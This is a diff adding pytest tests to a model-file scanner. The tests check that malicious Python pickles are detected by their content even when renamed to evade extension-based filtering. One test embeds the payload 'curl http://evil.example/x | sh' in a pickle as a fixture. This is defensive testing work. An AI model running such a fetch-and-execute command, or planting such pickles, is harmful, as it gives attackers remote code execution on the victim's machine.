@@ -542,6 +542,69 @@ class TestAmbiguousBinExtension:
         assert ModelFileScanner().scan_file(p) == []
 
 
+class TestUnmappedExtensionIsSniffed:
+    """`danger.dat` in the canary repo mcpotato/42-eicar-street is a real
+    `builtins.eval` pickle, and scan_file returned [] for it: the extension was
+    neither in _format_map nor in _AMBIGUOUS_EXTENSIONS, so the file was never
+    read. The identical bytes named `.pkl` reported CRITICAL. Renaming is the
+    cheapest evasion there is, so an explicitly named path is decided by
+    content."""
+
+    def test_malicious_pickle_under_unmapped_extension_is_scanned(self, tmp_path):
+        p = tmp_path / "danger.dat"
+        p.write_bytes(_os_system_pickle("curl http://evil.example/x | sh"))
+
+        findings = ModelFileScanner().scan_file(p)
+        assert any(
+            f.rule_id == "MFV-PICKLE-001" and f.severity == Severity.CRITICAL
+            for f in findings
+        ), f"unmapped extension skipped a malicious pickle: {[f.rule_id for f in findings]}"
+
+    def test_extension_does_not_change_the_verdict(self, tmp_path):
+        """The same bytes under two names must produce the same rule ids."""
+        payload = _os_system_pickle("id")
+        (tmp_path / "danger.dat").write_bytes(payload)
+        (tmp_path / "danger.pkl").write_bytes(payload)
+
+        scanner = ModelFileScanner()
+        as_dat = [f.rule_id for f in scanner.scan_file(tmp_path / "danger.dat")]
+        as_pkl = [f.rule_id for f in scanner.scan_file(tmp_path / "danger.pkl")]
+        assert as_dat == as_pkl
+
+    def test_file_with_no_extension_is_scanned(self, tmp_path):
+        p = tmp_path / "danger"
+        p.write_bytes(_os_system_pickle("id"))
+
+        assert any(f.rule_id == "MFV-PICKLE-001" for f in ModelFileScanner().scan_file(p))
+
+    def test_unidentifiable_file_is_still_skipped(self, tmp_path):
+        """Sniffing every named path must not turn ordinary files into scan
+        targets: nothing _sniff_format can identify means no finding."""
+        p = tmp_path / "notes.txt"
+        p.write_bytes(b"just some text, not a model\n" * 100)
+
+        assert ModelFileScanner().scan_file(p) == []
+
+    def test_oversized_unmapped_file_reports_the_gap(self, tmp_path, monkeypatch):
+        """Padding a payload past the size cap and renaming it must not buy
+        silence: the file is named, it was not read, so it is a coverage gap."""
+        p = tmp_path / "payload.dat"
+        p.write_bytes(_os_system_pickle("id"))
+        scanner = ModelFileScanner()
+        monkeypatch.setattr(scanner, "MAX_SCAN_BYTES", 8)
+
+        findings = scanner.scan_file(p)
+        assert [f.rule_id for f in findings] == ["MFV-SKIP-001"]
+
+    def test_directory_scan_still_filters_by_extension(self, tmp_path):
+        """Deliberate asymmetry: a directory walk that read every file to sniff
+        it would cost a full read of the whole tree, so discovery stays on the
+        extension list. Documented in docs/coverage.md."""
+        (tmp_path / "danger.dat").write_bytes(_os_system_pickle("id"))
+
+        assert ModelFileScanner().scan_directory(tmp_path) == []
+
+
 class TestZipMemberSizeCap:
     def test_scan_pytorch_zip_caps_oversized_member(self, tmp_path, monkeypatch):
         scanner = ModelFileScanner()
